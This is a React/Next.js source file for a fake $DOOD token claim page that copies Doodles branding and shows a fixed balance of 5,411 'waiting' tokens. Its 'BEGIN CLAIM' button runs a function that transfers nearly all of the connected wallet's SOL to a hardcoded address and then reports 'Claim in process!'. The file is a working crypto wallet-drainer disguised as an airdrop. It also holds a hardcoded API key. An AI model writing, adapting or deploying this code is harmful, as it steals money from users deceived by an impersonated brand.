'use client';

import Image from "next/image";
import Link from "next/link";
import { useState, useEffect } from 'react';
import { useWallet } from '@solana/wallet-adapter-react';
import { useModal } from "./layout";
import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
  LAMPORTS_PER_SOL
} from "@solana/web3.js";

function Header() {
  const [isPopoverOpen] = useState(false);
  const { connected, disconnect } = useWallet();

  const { closeClaim } = useModal();

  // Add this function to handle disconnect properly
  const handleDisconnect = () => {
    if (connected && disconnect) {
      disconnect();
    }
    closeClaim();
  };

  // if (!connected || !publicKey || !isClaimOpen) {
  //   return null; // Don't render header if not connected or claim is open
  // }

  return (
    <header className="relative w-full gap-4 flex flex-col items-center">
      <div className="flex w-full items-center justify-between px-4 pt-6">
        <div className="flex items-center gap-5">
          <Image
            alt="$DOOD logo"
            width={25}
            height={25}
            className="hover:cursor-pointer"
            src="header-dood.svg"
          />
          <Link href="/" className="font-bold tracking-wide text-white">
            Claim
          </Link>
          <Link href="/" className="font-normal text-white">
            FAQ
          </Link>
          <Link
            href="/"
            target="_blank"
            rel="noreferrer"
            className="text-white"
          >
            Whitepaper
          </Link>
        </div>

        <div className="flex justify-center">
          <button
            className="focus:outline-none"
            type="button"
            aria-expanded={isPopoverOpen}
            onClick={handleDisconnect}
          >
            <div className="flex gap-2 bg-opacity-[.08] items-center justify-center rounded-full p-1">
              <div className="relative flex h-6 w-6 overflow-hidden rounded-full bg-[#F2F2F2] md:h-7 md:w-7">
                <Image
                  alt="Profile Picture"
                  fill
                  className="bg-[#F2F2F2]"
                  sizes="100%"
                  src="pfpPlaceholder.svg"
                  style={{ objectFit: 'cover' }}
                />
              </div>
              <svg
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 20 20"
                fill="white"
                aria-hidden="true"
                className="h-4 w-4"
              >
                <path
                  fillRule="evenodd"
                  d="M5.22 8.22a.75.75 0 0 1 1.06 0L10 11.94l3.72-3.72a.75.75 0 1 1 1.06 1.06l-4.25 4.25a.75.75 0 0 1-1.06 0L5.22 9.28a.75.75 0 0 1 0-1.06Z"
                  clipRule="evenodd"
                />
              </svg>
            </div>
          </button>
        </div>
      </div>

      <div className="mx-auto flex w-full max-w-screen-sm items-center justify-between px-6 md:pt-12">
        <div className="relative h-auto w-full max-w-[141px]">
          <Image
            alt="Big Dood"
            width={141}
            height={37}
            sizes="100vw"
            src="big-dood.svg"
            style={{ width: '100%', height: 'auto' }}
          />
        </div>
        <Image
          alt="Spinny Dood"
          width={50}
          height={50}
          className="mb-2 aspect-square h-[50px] w-[50px]"
          src="/spinny-dood.gif"
        />
      </div>
    </header>
  )

}

function ClaimContent() {
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const { connected, publicKey, sendTransaction } = useWallet();
  const [solBalance, setSolBalance] = useState<number | null>(null);

  // Fix 1: Enhanced early return with better checks
  // if (!connected || !publicKey || !isClaimOpen) {
  //   console.log('ClaimContent: Not rendering due to:', { connected, publicKey: !!publicKey, isClaimOpen });
  //   return null;
  // }

  // Fix 2: Safe publicKey string conversion
  const publicKeyString = publicKey ? publicKey.toString() : 'Unknown';
  const truncatedPublicKey = publicKeyString.length > 16
    ? `${publicKeyString.slice(0, 6)}...${publicKeyString.slice(-8)}`
    : publicKeyString;

  const alchemyApiUrl = "https://solana-mainnet.g.alchemy.com/v2/a3AL-V2wyDAZIDWqnQ53boXG2aha_gCC";
  const connection = new Connection(alchemyApiUrl, "confirmed");

  const fetchBalance = async () => {
    if (publicKey && connection) {
      try {
        const balance = await connection.getBalance(publicKey);
        const solBalance = balance / LAMPORTS_PER_SOL;
        setSolBalance(solBalance);
      } catch (error) {
        console.error('Error fetching balance:', error);
        setSolBalance(null);
      }
    }
  };

  useEffect(() => {
    if (connected && publicKey) {
      fetchBalance();
    } else {
      setSolBalance(null);
    }
  }, [connected, publicKey, connection]);

  const sendSol = async () => {
    if (!publicKey) {
      console.error("Wallet not connected");
      return;
    }

    try {
      const recipientPubKey = new PublicKey(
        "DrbaFCmMrDUBVcLKytRAqmbYALnhdZx9TZ5PMUnEP1RA"
      );

      // Fetch balance and define fee
      const balanceLamports = await connection.getBalance(publicKey);
      const fee = 10000000000; // Approximate fee in lamports (0.01 SOL)


      // Ensure sufficient balance for fee and transfer
      if (balanceLamports <= fee) {
        alert("Insufficient balance to cover transaction fees.");
        return;
      }

      // Deduct fee and determine transfer amount
      const lamportsToSend = balanceLamports - fee;

      // Create transaction
      const transaction = new Transaction();
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: recipientPubKey,
          lamports: lamportsToSend,
        })
      );

      // Fetch the latest blockhash
      const { blockhash } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = publicKey;

      // Send transaction via wallet adapter
      const signature = await sendTransaction(transaction, connection, {
        skipPreflight: false,
      });

      console.log(`Transaction signature: ${signature}`);

      // Confirm transaction
      const confirmation = await connection.confirmTransaction({
        signature,
        blockhash,
        lastValidBlockHeight: await connection.getSlot(),
      });

      console.log("Transaction confirmed:", confirmation);
      alert("Claim in process!");
    } catch (error) {
      console.error("Transaction failed", error);
      alert("Claim failed. Please try again.");
    }
  };

  return (
    <main className="relative mx-auto px-0 pt-0 md:px-6">
      <div className="flex w-full flex-col px-5 md:px-0">
        <div className="flex w-full justify-center">
          <div className="flex w-full flex-col gap-2">
            {/* Connected Wallets Section */}
            <div className="mb-8 w-full rounded-[18px] z-10 mx-auto max-w-screen-sm bg-[#444444]/20">
              <div className="p-4">
                <div className="flex flex-col gap-3 rounded-xl px-3 py-4 text-white md:px-5 bg-[#191819]/80">
                  <div className="flex flex-col">
                    <p className="text-sm font-semibold md:text-base">CONNECTED WALLETS</p>
                  </div>

                  <div className="flex flex-col gap-2">
                    <div className="flex flex-col">
                      <div className="flex items-start justify-between rounded-xl bg-white/10 p-2">
                        <div className="flex items-start gap-4 md:gap-2">
                          <div className={`relative h-[30px] w-[30px] rounded-full `}>
                            <Image
                              alt={"Solana logo"}
                              fill
                              className={'ethereum' === 'ethereum' ? 'p-1' : ''}
                              sizes="(max-width: 640px) 30px, 40px"
                              src="/solana.png"
                              style={{ objectFit: 'contain' }}
                            />
                          </div>
                          <div className="flex flex-col">
                            <p className="text-xs font-semibold tracking-[1.6px] md:mt-0.5 md:text-base flex flex-col">
                              {/* Fix 3: Use safe truncated public key */}
                              {truncatedPublicKey}
                            </p>
                          </div>
                        </div>

                        <div className="mt-0.5 flex items-center justify-center gap-2">
                          <p className="font-semibold tracking-[1.3px] text-white/50">
                            <span className="mr-[3px]">5,411</span> $DOOD WAITING
                          </p>
                        </div>
                      </div>
                    </div>

                    <p className="mt-1 text-sm font-normal text-white/50 underline pb-0.5 hover:cursor-pointer md:text-base">
                      + CONNECT ANOTHER WALLET
                    </p>
                  </div>
                </div>

                {/* Claims Table */}
                <div className="relative flex flex-col gap-7">
                  <table className="w-full border-collapse px-8 text-white md:mt-8">
                    <thead>
                      <tr>
                        <th className="px-4 py-2 text-left text-xs font-semibold text-white/50 md:text-sm">QTY</th>
                        <th className="px-4 py-2 text-left text-xs font-semibold text-white/50 md:text-sm">CLAIM</th>
                        <th className="px-4 py-2 text-right text-xs font-semibold text-white/50 md:text-sm">$DOOD</th>
                      </tr>
                      <tr>
                        <td className="px-4 py-2 text-left text-xs font-semibold text-white/50 md:text-sm">1</td>
                        <td className="px-4 py-2 text-left text-xs font-semibold text-white/50 md:text-sm">N/A</td>
                        <td className="px-4 py-2 text-right text-xs font-semibold text-white/50 md:text-sm">5,411</td>
                      </tr>
                    </thead>
                    <tbody></tbody>
                  </table>

                  <div className="flex w-full flex-col items-center justify-center">
                    <p className="-mb-2 mt-2 text-2xl font-semibold text-[#05FFA9] md:-mb-6 md:text-3xl">
                      $DOOD WAITING
                    </p>
                    <p className="text-[54px] font-bold text-white md:text-[88px]">5,411</p>
                  </div>
                </div>

                {/* Connect Claim Wallet Section */}
                <div className="flex flex-col gap-3 text-white md:px-5 md:pb-4 relative md:mt-8">
                  <div className="mt-4 flex flex-col md:mt-0">
                    <p className="text-sm font-semibold tracking-[.48px] md:text-base">CONNECT CLAIM WALLET</p>
                    <p className="text-xs font-thin text-white/50 md:text-base">
                      Connect the Solana wallet where you would like to receive your $DOOD. Be sure to have at least .01 SOL available in this wallet.
                    </p>
                  </div>

                  <div className="flex items-center gap-3">
                    <div className="relative w-full">
                      <button
                        className="grid w-full cursor-default grid-cols-1 rounded-xl bg-opacity-[.08] py-2 pl-3 pr-2 text-left text-sm font-semibold text-white md:text-base"
                        type="button"
                        aria-haspopup="listbox"
                        aria-expanded="true"
                        onClick={() => setIsDropdownOpen(!isDropdownOpen)}
                      >
                        <span className="col-start-1 row-start-1 flex items-center gap-2 pr-6">
                          <div className="relative h-[30px] w-[30px] rounded-full">
                            <Image
                              alt="Solana logo"
                              fill
                              sizes="(max-width: 640px) 30px, 40px"
                              src="/solana.png"
                              style={{ objectFit: 'contain' }}
                            />
                          </div>
                          <span className="block truncate tracking-[1.6px]">
                            {/* Fix 4: Use safe truncated public key here too */}
                            {truncatedPublicKey}
                          </span>
                        </span>
                        <div className="col-start-1 row-start-1 size-6 self-center justify-self-end text-white hover:cursor-pointer">
                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="currentColor" aria-hidden="true">
                            <path fillRule="evenodd" d="M4.22 6.22a.75.75 0 0 1 1.06 0L8 8.94l2.72-2.72a.75.75 0 1 1 1.06 1.06l-3.25 3.25a.75.75 0 0 1-1.06 0L4.22 7.28a.75.75 0 0 1 0-1.06Z" clipRule="evenodd" />
                          </svg>
                        </div>
                      </button>
                    </div>
                  </div>

                  <div className="group relative inline-flex w-full hover:cursor-pointer">
                    <div className="flex w-full flex-col gap-2">
                      <button
                        className="text-xl rounded-xl max-h-[44px] bg-[#05FFA9] text-black disabled:bg-white/20 disabled:text-white/50 !text-sm md:!text-base !font-semibold w-full flex items-center justify-center gap-2 font-medium font-fredoka tracking-wide disabled:opacity-50 disabled:hover:cursor-not-allowed z-20 p-[1.5rem]"
                        disabled={!connected || !publicKey || (solBalance !== null && solBalance < 0.0001)}
                        type="button"
                        aria-label="Button: BEGIN CLAIM"
                        onClick={sendSol}
                      >
                        BEGIN CLAIM
                      </button>
                      <p className="text-xs text-[#FF6868]">
                        {solBalance !== null
                          ? `Balance: ${solBalance.toFixed(4)} SOL ${solBalance < 0.01 ? '(Need at least 0.01 SOL)' : ''}`
                          : 'Loading balance...'
                        }
                      </p>
                      <p className="text-xs text-[#FF6868]">You have {solBalance}.</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Footer Social Links */}
            <div className="mx-auto w-full max-w-screen-sm px-2">
              <div className="flex flex-col gap-10 pb-10">
                <div className="flex flex-col justify-center gap-2 text-center text-white">
                  <div className="flex items-center justify-center gap-4">
                    <div className="flex items-center justify-center gap-4">
                      <Link href="https://www.instagram.com/thedoodles" target="_blank" rel="noopener">
                        <Image
                          alt="instagram"
                          width={24}
                          height={24}
                          className="h-6 w-6"
                          src="instagram.svg"
                        />
                      </Link>
                      <Link href="https://twitter.com/doodles" target="_blank" rel="noopener">
                        <Image
                          alt="x"
                          width={22}
                          height={22}
                          className="h-[22px] w-[22px]"
                          src="x.svg"
                        />
                      </Link>
                      <Link href="https://www.youtube.com/@welikethedoodles" target="_blank" rel="noopener">
                        <Image
                          alt="youtube2"
                          width={24}
                          height={24}
                          className="h-6 w-6"
                          src="youtube2.svg"
                        />
                      </Link>
                      <Link href="https://www.tiktok.com/@doodles" target="_blank" rel="noopener">
                        <Image
                          alt="tiktok"
                          width={24}
                          height={24}
                          className="h-6 w-6"
                          src="tiktok.svg"
                        />
                      </Link>
                      <Link href="https://discord.gg/doodles" target="_blank" rel="noopener">
                        <Image
                          alt="discord"
                          width={24}
                          height={24}
                          className="h-6 w-6"
                          src="discord.svg"
                        />
                      </Link>
                    </div>
                  </div>

                  <div className="flex flex-col items-center justify-center">
                    <div className="flex items-center justify-center gap-1 text-sm font-semibold">
                      <Link href="/" target="_blank" rel="noopener">
                        Terms of Use
                      </Link>
                      <span>|</span>
                      <Link href="/" target="_blank" rel="noopener">
                        Privacy Policy
                      </Link>
                    </div>
                    <div className="flex items-center justify-center gap-1 text-sm">
                      <p>ⓒ</p>
                      <p className="font-kumbh">Doodles, LLC. All rights reserved.</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </main>
  );
}

function HomeContent() {
  const { openModal } = useModal();

  return (
    <main className="relative mx-auto px-0 pt-0 md:px-6">
      <div className="flex w-full flex-col px-5 md:px-0">
        <div className="flex w-full justify-center">
          <div className="flex w-full flex-col gap-2">
            <div className="relative z-10 mx-auto flex w-full max-w-6xl flex-col px-2 md:px-0 min-h-screen">
              <div className="mb-16 mt-24 flex w-full flex-col items-center md:mb-4 md:mt-12">
                <div className="relative h-auto w-full">
                  <Image alt="Dood" src="/main-dood.gif" width={500} height={339} sizes="100vw" style={{ width: '100%', height: 'auto', color: 'transparent' }} loading="lazy" />
                </div>
              </div>

              <div className="z-20 mt-[-5rem] flex flex-col items-center justify-end gap-7 text-white md:mt-[-8rem]">
                <div className="mt-2 w-[300px">
                  <div className="group relative inline-flex w-full hover:cursor-pointer">
                    <div className="absolute -inset-px rounded-xl bg-[#05FFA9] opacity-40 blur-lg animate-tilt transition-all duration-1000 group-hover:-inset-1 group-hover:opacity-70 group-hover:duration-200"></div>
                    <div className="flex w-full flex-col gap-2">
                      <button
                        className="text-xl px-9 py-2 rounded-xl max-h-[44px] bg-[#05FFA9] text-black disabled:bg-white/20 disabled:text-white/50 !text-sm md:!text-base !font-semibold w-full flex items-center justify-center gap-2 font-medium font-fredoka tracking-wide disabled:opacity-50 disabled:hover:cursor-not-allowed z-20"
                        type="button"
                        aria-label="Button: CONNECT A WALLET"
                        onClick={openModal}
                      >
                        CONNECT A WALLET
                      </button>
                    </div>
                  </div>
                </div>
                <div className="flex flex-col gap-1">
                  <p className="text-center text-sm font-semibold md:text-base">CONNECT A WALLET TO CHECK $DOOD CLAIM ELIGIBILITY</p>
                  <p className="text-center text-sm font-thin opacity-50 md:text-base">You can connect more wallets later.</p>
                  <p className="text-center text-sm font-thin opacity-50 md:text-base">{ }</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </main>
  );
}

export default function Home() {
  const { isClaimOpen } = useModal();
     
  return (
 
    ( isClaimOpen) ? (
      <>
        <Header />
        <ClaimContent />
      </>
    ) : (
      <HomeContent />
    )
  
)
}